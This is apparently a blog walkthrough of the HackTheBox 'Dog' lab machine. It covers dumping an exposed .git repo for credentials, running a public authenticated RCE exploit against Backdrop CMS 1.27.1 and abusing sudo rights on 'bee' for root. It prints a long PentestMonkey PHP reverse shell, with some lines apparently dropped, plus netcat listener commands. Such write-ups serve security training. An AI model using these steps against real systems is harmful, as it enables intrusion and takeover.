## Introduction
This is an easy Linux machine on
[HackTheBox](https://app.hackthebox.com/machines/Dog){:target="_blank"}{:rel="noopener noreferrer"}.

> This is what a hint will look like!
{: .prompt-tip }

## Enumeration
You can't hack into a server if you don't know
anything about it! We want to gather as much information
about the system as possible.

### Port Scan
Let's start with a port scan to see what services are
accessible

```bash
rustscan -a MACHINE_IP -- -A -oA scan -sC
```

![rustscan](/images/htb-dog/rustscan.png)

We have two open ports:
- 22: SSH
- 80: HTTP

### Website
With most HTB machines we need to map the machine IP to
a domain name before we can visit the website. In your
`/etc/hosts` file add the following

```
MACHINE_IP dog.htb
```

Visiting the site hosted on port 80 we find

![homepage](/images/htb-dog/homepage.png)

Immediately we can find a link to a login page and a user named
"dogBackDropSystem"! Let's continue enumeration by visiting `/robots.txt`

![robots](/images/htb-dog/robots.png)

There are quite a few links but let's download and read the `README.md` file

![readme](/images/htb-dog/readme.png)

The website seems to have installed
[Backdrop CMS](https://github.com/backdrop/backdrop){:target="_blank"}{:rel="noopener noreferrer"}!
Searching through the website directories we can visit `/core/modules/config`

![config-dir](/images/htb-dog/config-dir.png)

Download and read `config.info`

![config-info](/images/htb-dog/config-info.png)

We now know that the server is running `Backdrop CMS` version `1.27.1`!!!

### Git
> Look into git-dumper
{: .prompt-tip }

Looking at the script output during port enumeration, we can find a reference
to a `.git` directory

![git-scan](/images/htb-dog/git-scan.png)

Using the tool
[git-dumper](https://github.com/arthaud/git-dumper){:target="_blank"}{:rel="noopener noreferrer"}, we can copy the git repo to our local machine

```bash
git-dumper http://dog.htb ./git-dump
```

We should try to find some credentials within the repo. For usernames
let's look for references to `@dog.htb`

```bash
grep -ri '@dog.htb'
```

![git-usernames](/images/htb-dog/git-usernames.png)

Now we know there are two users named `dog` and `tiffany`!

Time to find some passwords. These are usually located in configuration or 
settings files. Check out `settings.php` in the root directory

![settings-creds](/images/htb-dog/settings-creds.png)

We have a password which gives us everything we need to move forward

## Intial Foothold
> Use credentials found during enumeration and find an exploit for Backdrop CMS v1.27.1
{: .prompt-tip }

### Admin Dashboard
Using the usernames and password we found, we can login to the admin dashboard

![admin-dashboard](/images/htb-dog/admin-dashboard.png)

The credentials work so let's take advantage of these
privileges

### Authenticated Remote Code Execution
Through enumeration we know that the server is running `Backdrop CMS v1.27.1`.
`searchsploit` can find public exploits for the service

```bash
searchsploit backdrop
```

![searchsploit](/images/htb-dog/searchsploit.png)

Let's download the exploit and read the code

```bash
searchsploit -m 52021
```

The exploit leverates the module installation feature to create a malicious
module which installs a `PHP` web shell onto the server. The script generates
two files. `shell.info` is used for module meta information by `Backdrop`.
`shell.php` contains the `PHP` code for the web shell. 

First let's run the exploit and then modify the payload to suit our needs

```bash
python3 52021.py http://dog.htb
```

![rce-payload](/images/htb-dog/rce-payload.png)

If we try to follow the exploit instructions, we run into a few issues. First
we need to find the module installation directory. Visiting `http://dog.htb/admin/modules/install` doesn't work but we can check our previous queries and
change the URL accordingly

```
http://dog.htb/?q=admin/modules/install
```

![module-install](/images/htb-dog/module-install.png)

When we try to install the `.zip` file manually, we're told the server doesn't
accept it. We can change the format to one of the following

![zip-bad](/images/htb-dog/zip-bad.png)

While we're at it, we should change `shell.php` from a web shell into a reverse
shell since the server will delete the file periodically. Just replace the code
in `shell.php` with the `PHP PentestMonkey` reverse shell on [revshells.com](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}. It
should look something like this

```php

$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {

		exit(1);

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Now that the files are prepared we can create a `tar.gz` archive using
`tar`

```bash
tar -czvf shell.tar.gz shells
```

![payload-tar](/images/htb-dog/payload-tar.png)

Setup a listener on our machine to accept the reverse shell request

```bash
nc -lvnp 4444
```

Now we can install the module and trigger our reverse shell payload by
visiting

```
http://dog.htb/modules/shell/shell.php
```

![www-data](/images/htb-dog/www-data.png)

## Privilege Escalation
### User
> Reuse credentials!
{: .prompt-tip }

Now that we have access to the server let's enumerate the users on the system
with access to a shell

```bash
cat /etc/passwd | grep bash
```

![etc-passwd](/images/htb-dog/etc-passwd.png)

Using the same password we used for `tiffany`, switch to the user
`johncusack`

```bash
su johncusack
```

Perfect we can grab the first flag!

![user-txt](/images/htb-dog/user-txt.png)

> Now that we know about the `johncusack` user, we can `ssh` into the machine
with their credentials for a more stable shell!
{: .prompt-info }

### Root
> What commands can `johncusack` run as `root`?
{: .prompt-tip }

Check what commands we can run using `sudo`

```bash
sudo -l
```

![sudo](/images/htb-dog/sudo.png)

Reading the help menu for the `bee` command reveals options to run arbitrary
`PHP` code!

```bash
bee --help
```

![bee-help](/images/htb-dog/bee-help.png)

Using the `PHP PentestMonkey` reverse shell on [revshells.com](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"} we can
create another payload to give us a `root` shell! I placed it
in `/tmp/revshell.php`

Setup a listener as before

```bash
nc -lvnp 4444
```

In order for the `bee` command to run correctly we need to be in the
`Backdrop` root directory. Then we can run our `PHP` reverse shell payload
as `root`

```bash
cd /var/www/html
sudo /usr/local/bin/bee scr /tmp/revshell.php
```

![root-txt](/images/htb-dog/root-txt.png)

## Conclusion
By using `git-dumper`, we were able to obtain the `Backdrop CMS` version number,
as well as a username and password for the admin dashboard. These privileges
allowed us to run a publicly disclosed `Authenticated Remote Code Execution`
exploit that gave us a foothold into the machine. Reusing the same password
from the admin dashboard escalated our privilges from `www-data` to the user
`johncusack` on the server. Enumerating `sudo` privileges gave us the final
command to run arbitrary `PHP` code, giving us a `root` shell!
